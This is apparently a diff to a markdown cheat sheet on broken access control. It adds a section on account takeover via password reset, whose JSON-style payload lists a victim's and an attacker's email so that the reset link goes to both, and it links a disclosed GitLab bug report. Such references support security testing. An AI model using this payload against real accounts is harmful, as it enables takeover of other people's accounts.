@@ -1,5 +1,6 @@
 ## Index
 
+1. [ATO via Password Reset](#ATO-via-Password-Reset)
 1. [Unprotected Functionality](#Unprotected-functionality)
 2. [Parameter-Based Access Control](#Parameter-based-access-control)
 3. [Broken Access Control Resulting from Platform Misconfiguration (URL and Method-Based)](#Broken-access-control-resulting-from-platform-misconfiguration-Url-and-Method-based)
@@ -9,6 +10,18 @@
 
 ---
 
+### ATO via Password Reset
+```
+ "user" {
+     "email" [
+              "victim@gmail.com",
+              "attacker@gmail.com"
+       ]
+ }
+```
+
+PoC: [Account Takeover via Password Reset without user interactions in Gitlab](https://hackerone.com/reports/2293343)
+___
 ### Unprotected functionality
 
     admin
